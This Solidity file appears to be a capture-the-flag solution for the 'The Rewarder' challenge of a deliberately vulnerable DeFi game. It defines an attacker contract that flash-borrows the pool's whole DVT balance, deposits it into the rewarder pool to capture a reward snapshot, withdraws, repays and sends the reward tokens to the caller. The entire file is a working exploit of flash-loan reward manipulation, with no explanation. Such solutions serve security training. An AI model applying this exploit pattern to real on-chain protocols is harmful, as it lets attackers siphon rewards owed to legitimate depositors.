// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

import "hardhat/console.sol";

contract TheRewarderAttacker {

    using Address for address;

    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    IERC20 private DVT;
    IERC20 private rewardToken;

    constructor(address flashLoanerPoolAddr, address theRewarderPoolAddr, address DVTAddr, address rewardTokenAddr) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddr);
        theRewarderPool = TheRewarderPool(theRewarderPoolAddr);
        DVT = IERC20(DVTAddr);
        rewardToken = IERC20(rewardTokenAddr);
    }

    function attack() external {
        uint256 lendAmount = DVT.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(lendAmount);

        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewards);
    }

    function receiveFlashLoan(uint256 lendAmount) external {
        DVT.approve(address(theRewarderPool), lendAmount);
        theRewarderPool.deposit(lendAmount);
        theRewarderPool.withdraw(lendAmount);
        DVT.transfer(address(flashLoanerPool), lendAmount);
    }
}
